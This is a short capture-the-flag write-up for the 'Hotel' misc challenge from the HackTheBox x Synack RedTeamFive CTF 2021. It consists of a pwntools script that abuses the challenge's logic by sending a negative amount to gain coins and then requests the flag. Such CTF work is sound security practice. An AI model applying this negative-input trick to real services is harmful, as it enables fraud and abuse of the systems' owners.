---
name: Hotel (2021)
event: HackTheBox x Synack RedTeamFive CTF 2021
category: Misc
description: Writeup for Hotel (misc) - HackTheBox x Synack RedTeamFive CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Hotel

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

io = remote('ip', 31337)

# Loop through 40 times (backwards)
# This will allow us to deal with XOR in final stage
for i in range(40, 0, -1):
    io.sendline('1')
    io.sendlineafter(':', str(i))

# Get coins
io.sendline('2')
# Negative value to add 100 coins
io.sendlineafter('?', '-100')
# Try and get flag
io.sendline('3')

# Win?
io.interactive()
```
{% endcode %}
